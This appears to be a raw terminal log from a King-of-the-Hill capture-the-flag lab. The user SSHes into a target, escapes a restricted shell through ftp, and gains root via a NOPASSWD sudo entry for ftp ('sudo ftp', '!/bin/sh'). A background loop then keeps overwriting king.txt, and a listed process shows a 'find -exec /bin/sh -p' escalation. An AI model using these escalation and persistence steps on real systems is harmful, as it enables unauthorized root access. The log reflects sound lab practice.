┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 58:8a:5a:0e:50:e3  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.39  netmask 255.255.254.0  destination 10.10.16.39
        inet6 fe80::aa89:abe9:808a:2f28  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:4::1025  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 102  bytes 6936 (6.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 118  bytes 4800 (4.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.4.62.198  netmask 255.255.128.0  destination 10.4.62.198
        inet6 fe80::d1d2:6a10:1d0c:4a7d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 156 (156.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 252 (252.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.43.77  netmask 255.255.255.0  broadcast 192.168.43.255
        inet6 fe80::8794:a1f9:c853:7678  prefixlen 64  scopeid 0x20<link>
        ether 44:03:2c:a3:57:1e  txqueuelen 1000  (Ethernet)
        RX packets 164485  bytes 149598021 (142.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 111446  bytes 21110501 (20.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# 
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# nc -nlvp 1234                                          
listening on [any] 1234 ...
connect to [10.4.62.198] from (UNKNOWN) [10.10.131.192] 52684
                                                                                                                                                   
┌──(root㉿kali)-[~]
┌──(root㉿kali)-[~]
└─# ps aux | grep tun     
root      180749  0.0  0.0   6432  1920 pts/0    S+   19:33   0:00 grep --color=auto tun
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep tun0
root      181020  0.0  0.0   6432  2048 pts/0    S+   19:34   0:00 grep --color=auto tun0
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo ip link set tun0 down
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 58:8a:5a:0e:50:e3  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.4.62.198  netmask 255.255.128.0  destination 10.4.62.198
        inet6 fe80::d1d2:6a10:1d0c:4a7d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 47  bytes 4188 (4.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 62  bytes 23974 (23.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.43.77  netmask 255.255.255.0  broadcast 192.168.43.255
        inet6 fe80::8794:a1f9:c853:7678  prefixlen 64  scopeid 0x20<link>
        ether 44:03:2c:a3:57:1e  txqueuelen 1000  (Ethernet)
        RX packets 181674  bytes 165091535 (157.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 121205  bytes 23061491 (21.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo ip link delete tun0
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn   

root       30964  0.2  0.2  13816  8192 ?        R    14:35   0:42 openvpn /home/kali/Downloads/starting_point_cyberthirty30.ovpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182569  0.0  0.0   6432  2048 pts/0    S+   19:37   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn

root       30964  0.3  0.2  13816  8192 ?        R    14:35   0:58 openvpn /home/kali/Downloads/starting_point_cyberthirty30.ovpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182700  0.0  0.0   6432  2176 pts/0    S+   19:37   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 30964
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182928  0.0  0.0   6432  2048 pts/0    S+   19:38   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 167415  
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 182928                                        
kill: (182928): No such process
                                                                                                                                                   
┌──(root㉿kali)-[~]
┌──(root㉿kali)-[~]
└─# nano /etc/hosts
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# smbclient -L \\\\10.10.132.160    
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_CONNECTION_DISCONNECTED
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# ping 10.10.132.160   
PING 10.10.132.160 (10.10.132.160) 56(84) bytes of data.
64 bytes from 10.10.132.160: icmp_seq=1 ttl=61 time=739 ms
64 bytes from 10.10.132.160: icmp_seq=2 ttl=61 time=740 ms
64 bytes from 10.10.132.160: icmp_seq=3 ttl=61 time=792 ms
^C
--- 10.10.132.160 ping statistics ---
4 packets transmitted, 3 received, 25% packet loss, time 3000ms
rtt min/avg/max/mdev = 739.435/756.982/792.003/24.763 ms
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# ssh shifu@10.10.132.160       
The authenticity of host '10.10.132.160 (10.10.132.160)' can't be established.
ED25519 key fingerprint is SHA256:8YIbia3DtzTm9rElf3yLUwoa07R7AEQ7WWARx3D6HYY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.160' (ED25519) to the list of known hosts.
shifu@10.10.132.160's password: 
Last login: Wed Oct  2 14:27:12 2024 from ip-10-17-68-193.eu-west-1.compute.internal
[shifu@panda ~]$ ftp
ftp> !/bin/sh
sh-4.2$ ls
flag.txt
sh-4.2$ echo cyber30 >/root/king.txt
sh: /root/king.txt: Permission denied
sh-4.2$ echo cyber30 >>/root/king.txt
sh: /root/king.txt: Permission denied
sh-4.2$ cat flag.txt
YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
sh-4.2$ cd /
sh-4.2$ ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
sh-4.2$ cd root
sh: cd: root: Permission denied
sh-4.2$ chattr -i root
sh: /usr/bin/chattr: Permission denied
sh-4.2$ nano /etc/sudoers
sh: nano: command not found
sh-4.2$ sudo
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...
sh-4.2$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for shifu: 
Sorry, try again.
[sudo] password for shifu: 
Sorry, try again.
[sudo] password for shifu: 
sudo: 3 incorrect password attempts
sh-4.2$ sudo -l
Matching Defaults entries for shifu on panda:
    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User shifu may run the following commands on panda:
    (root) NOPASSWD: /usr/bin/ftp
sh-4.2$ id
uid=1001(shifu) gid=1001(shifu) groups=1001(shifu)
sh-4.2$ sudo ftp
ftp> !/bin/sh
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cd root
sh-4.2# ls
king.txt  koth
sh-4.2# chattr -i king.txt
sh: /bin/chattr: Permission denied
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat cyber30
cat: cyber30: No such file or directory
sh-4.2# cat king.txt
cyber30
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat king.txt
cyber30
sh-4.2# ( while true; do echo cyber30 > king.txt; sleep 0.2; done ) &
[1] 2063
sh-4.2# cat king.txt
cyber30
sh-4.2# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 125344  3828 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    14:26   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    14:26   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    14:26   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    14:26   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        R    14:26   0:00 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   14:26   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    14:26   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    14:26   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   14:26   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    14:26   0:00 [xenwatch]
root        16  0.0  0.0      0     0 ?        S    14:26   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    14:26   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S<   14:26   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S<   14:26   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root        22  0.0  0.0      0     0 ?        S<   14:26   0:00 [kblockd]
root        23  0.0  0.0      0     0 ?        S<   14:26   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   14:26   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        S    14:26   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        SN   14:26   0:00 [ksmd]
root        31  0.0  0.0      0     0 ?        SN   14:26   0:00 [khugepaged]
root        32  0.0  0.0      0     0 ?        S<   14:26   0:00 [crypto]
root        40  0.0  0.0      0     0 ?        S<   14:26   0:00 [kthrotld]
root        42  0.0  0.0      0     0 ?        S<   14:26   0:00 [kmpath_rdacd]
root        43  0.0  0.0      0     0 ?        S<   14:26   0:00 [kaluad]
root        44  0.0  0.0      0     0 ?        S<   14:26   0:00 [kpsmoused]
root        46  0.0  0.0      0     0 ?        S<   14:26   0:00 [ipv6_addrconf]
root        59  0.0  0.0      0     0 ?        S<   14:26   0:00 [deferwq]
root        90  0.0  0.0      0     0 ?        S    14:26   0:00 [kauditd]
root       269  0.0  0.0      0     0 ?        S<   14:26   0:00 [ata_sff]
root       273  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_0]
root       274  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_0]
root       275  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_1]
root       276  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_1]
root       277  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:3]
root       341  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       342  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       352  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       353  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       365  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       366  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfsalloc]
root       367  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs_mru_cache]
root       368  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/dm-0]
root       369  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/dm-0]
root       370  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/dm-0]
root       371  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/dm-0]
root       372  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/dm-]
root       373  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/dm-0]
root       374  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/d]
root       375  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/dm-0]
root       376  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:1H]
root       443  0.0  0.1  39240  2856 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-journald
root       466  0.0  0.0 190372  1344 ?        Ss   14:26   0:00 /usr/sbin/lvmetad -f
root       474  0.0  0.1  44328  1904 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-udevd
root       534  0.0  0.0      0     0 ?        S<   14:26   0:00 [ttm_swap]
root       546  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/xvda1]
root       547  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/xvda1]
root       548  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/xvda1]
root       549  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/xvda1]
root       550  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/xvd]
root       551  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/xvda1]
root       552  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/x]
root       553  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/xvda1]
root       569  0.0  0.0  55516   888 ?        S<sl 14:26   0:00 /sbin/auditd
root       593  0.0  0.5 746024 10672 ?        Ssl  14:26   0:00 /root/koth
polkitd    597  0.0  0.6 538512 13104 ?        Ssl  14:26   0:00 /usr/lib/polkit-1/polkitd --no-debug
dbus       601  0.0  0.1  58240  2472 ?        Ss   14:26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-act
chrony     614  0.0  0.0 117796  1716 ?        S    14:26   0:00 /usr/sbin/chronyd
root       616  0.0  0.5 478316 10720 ?        Ssl  14:26   0:00 /usr/sbin/NetworkManager --no-daemon
root       617  0.0  0.0  26380  1764 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-logind
root       619  0.0  0.0 126292  1588 ?        Ss   14:26   0:00 /usr/sbin/crond -n
root       853  0.0  0.1 102816  2364 ?        Ss   14:26   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclie
root       910  0.0  1.0 573896 19200 ?        Ssl  14:26   0:00 /usr/bin/python -Es /usr/sbin/tuned -l -P
root       913  0.0  0.6 356636 11996 ?        Ss   14:26   0:00 php-fpm: master process (/etc/php-fpm.conf)
root       925  0.0  0.2 112840  4292 ?        Ss   14:26   0:00 /usr/sbin/sshd -D
root       927  0.0  0.2 222760  4516 ?        Ssl  14:26   0:00 /usr/sbin/rsyslogd -n
root       929  0.0  0.3 353308  6872 ?        Ss   14:26   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       933  0.0  0.0 110108   856 tty1     Ss+  14:26   0:00 /sbin/agetty --noclear tty1 linux
root       934  0.0  0.0 110108   864 ttyS0    Ss+  14:26   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
po        1061  0.9  8.7 2539780 165360 ?      Sl   14:26   0:13 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -
named     1068  0.0  3.0 167812 57620 ?        Ssl  14:26   0:00 /usr/sbin/named -u named -c /etc/named.conf
root      1123  0.0  0.8 430424 15484 ?        Ss   14:26   0:00 /usr/sbin/httpd -DFOREGROUND
mysql     1136  0.0  0.0 113312  1600 ?        Ss   14:26   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
mysql     1299  0.0  4.9 1102652 93180 ?       Sl   14:26   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64
root      1340  0.0  0.1  89620  2092 ?        Ss   14:26   0:00 /usr/libexec/postfix/master -w
postfix   1341  0.0  0.2  89724  4056 ?        S    14:26   0:00 pickup -l -t unix -u
postfix   1342  0.0  0.2  89792  4084 ?        S    14:26   0:00 qmgr -l -t unix -u
root      1356  0.0  0.6 424844 11636 ?        Ss   14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
po        1357  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1358  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1359  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1360  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1361  0.0  0.3 356636  6024 ?        S    14:26   0:00 php-fpm: pool www
shifu     1388  0.0  1.3 516088 24656 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1389  0.0  1.2 441020 22620 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1391  0.0  1.6 523364 31836 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
root      1401  0.0  0.1 120884  2120 ?        Ss   14:26   0:00 nginx: master process /usr/sbin/nginx
nginx     1402  0.0  0.1 121288  3580 ?        S    14:26   0:00 nginx: worker process
root      1577  0.0  0.1 419748  3116 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1578  0.0  0.1 420204  3164 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1647  0.0  0.1 424828  3200 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1698  0.0  0.3 159308  6040 ?        Ss   14:27   0:00 sshd: shifu [priv]
shifu     1704  0.0  0.1 159308  2424 ?        S    14:27   0:00 sshd: shifu@pts/0
shifu     1708  0.0  0.1 115444  2032 pts/0    Ss   14:27   0:00 -rbash
root      1728  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh ; -quit
shifu     1729  0.0  0.0 115440  1828 pts/0    S    14:27   0:00 /bin/sh
root      1732  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh -p ; -quit
root      1733  0.0  0.1 115444  1912 pts/0    S+   14:27   0:00 /bin/sh -p
shifu     1740  0.0  0.6 431424 12892 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1747  0.0  1.1 513284 21780 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1751  0.0  0.9 510540 18804 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1759  0.0  1.6 523336 31680 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1762  0.0  0.9 436032 17508 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1764  0.0  0.4 430424  8824 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1766  0.0  0.9 510540 18788 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
root      1846  0.0  0.0      0     0 ?        S    14:31   0:00 [kworker/0:0]
root      1848  0.0  1.4 437612 27900 pts/0    T    14:31   0:00 /usr/bin/python /usr/bin/yum install kernel-devel-3.10.0-862.el7.x86_64
root      1916  0.0  0.3 159308  6248 ?        Ss   14:36   0:00 sshd: shifu [priv]
shifu     1918  0.0  0.1 159308  2432 ?        S    14:36   0:00 sshd: shifu@pts/1
shifu     1919  0.0  0.1 115444  2012 pts/1    Ss   14:36   0:00 -rbash
root      1938  0.0  0.0      0     0 ?        S    14:36   0:00 [kworker/0:2]
shifu     1964  0.0  0.0 119052  1524 pts/1    S    14:39   0:00 ftp
shifu     1965  0.0  0.1 115440  1888 pts/1    S    14:39   0:00 /bin/sh
root      1999  0.0  0.0      0     0 ?        R    14:41   0:00 [kworker/0:1]
root      2026  0.0  0.2 218524  4020 pts/1    S    14:44   0:00 sudo ftp
root      2027  0.0  0.0 119052  1524 pts/1    S    14:44   0:00 ftp
root      2033  0.0  0.0 115444  1880 pts/1    S    14:45   0:00 /bin/sh
root      2063  0.1  0.0 115444   804 pts/1    S    14:49   0:00 /bin/sh
root      2150  0.0  0.0 107956   356 pts/1    S    14:49   0:00 sleep 0.2
root      2151  0.0  0.0 155372  1876 pts/1    R+   14:49   0:00 ps aux
sh-4.2# chattr
sh: /bin/chattr: Permission denied
sh-4.2# ( while true; do echo cyber30 > king.txt; sleep 0.1; done ) &
[2] 2615
sh-4.2# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 125344  3828 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    14:26   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    14:26   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    14:26   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    14:26   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        R    14:26   0:00 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   14:26   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    14:26   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    14:26   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   14:26   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    14:26   0:00 [xenwatch]
root        16  0.0  0.0      0     0 ?        S    14:26   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    14:26   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S<   14:26   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S<   14:26   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root        22  0.0  0.0      0     0 ?        S<   14:26   0:00 [kblockd]
root        23  0.0  0.0      0     0 ?        S<   14:26   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   14:26   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        S    14:26   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        SN   14:26   0:00 [ksmd]
root        31  0.0  0.0      0     0 ?        SN   14:26   0:00 [khugepaged]
root        32  0.0  0.0      0     0 ?        S<   14:26   0:00 [crypto]
root        40  0.0  0.0      0     0 ?        S<   14:26   0:00 [kthrotld]
root        42  0.0  0.0      0     0 ?        S<   14:26   0:00 [kmpath_rdacd]
root        43  0.0  0.0      0     0 ?        S<   14:26   0:00 [kaluad]
root        44  0.0  0.0      0     0 ?        S<   14:26   0:00 [kpsmoused]
root        46  0.0  0.0      0     0 ?        S<   14:26   0:00 [ipv6_addrconf]
root        59  0.0  0.0      0     0 ?        S<   14:26   0:00 [deferwq]
root        90  0.0  0.0      0     0 ?        S    14:26   0:00 [kauditd]
root       269  0.0  0.0      0     0 ?        S<   14:26   0:00 [ata_sff]
root       273  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_0]
root       274  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_0]
root       275  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_1]
root       276  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_1]
root       277  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:3]
root       341  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       342  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       352  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       353  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       365  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       366  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfsalloc]
root       367  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs_mru_cache]
root       368  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/dm-0]
root       369  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/dm-0]
root       370  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/dm-0]
root       371  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/dm-0]
root       372  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/dm-]
root       373  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/dm-0]
root       374  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/d]
root       375  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/dm-0]
root       376  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:1H]
root       443  0.0  0.1  39240  2868 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-journald
root       466  0.0  0.0 190372  1344 ?        Ss   14:26   0:00 /usr/sbin/lvmetad -f
root       474  0.0  0.1  44328  1904 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-udevd
root       534  0.0  0.0      0     0 ?        S<   14:26   0:00 [ttm_swap]
root       546  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/xvda1]
root       547  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/xvda1]
root       548  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/xvda1]
root       549  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/xvda1]
root       550  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/xvd]
root       551  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/xvda1]
root       552  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/x]
root       553  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/xvda1]
root       569  0.0  0.0  55516   888 ?        S<sl 14:26   0:00 /sbin/auditd
root       593  0.0  0.5 746024 10672 ?        Ssl  14:26   0:00 /root/koth
polkitd    597  0.0  0.6 538512 13104 ?        Ssl  14:26   0:00 /usr/lib/polkit-1/polkitd --no-debug
dbus       601  0.0  0.1  58240  2472 ?        Ss   14:26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-act
chrony     614  0.0  0.0 117796  1716 ?        S    14:26   0:00 /usr/sbin/chronyd
root       616  0.0  0.5 478316 10720 ?        Ssl  14:26   0:00 /usr/sbin/NetworkManager --no-daemon
root       617  0.0  0.0  26380  1764 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-logind
root       619  0.0  0.0 126292  1588 ?        Ss   14:26   0:00 /usr/sbin/crond -n
root       853  0.0  0.1 102816  2364 ?        Ss   14:26   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclie
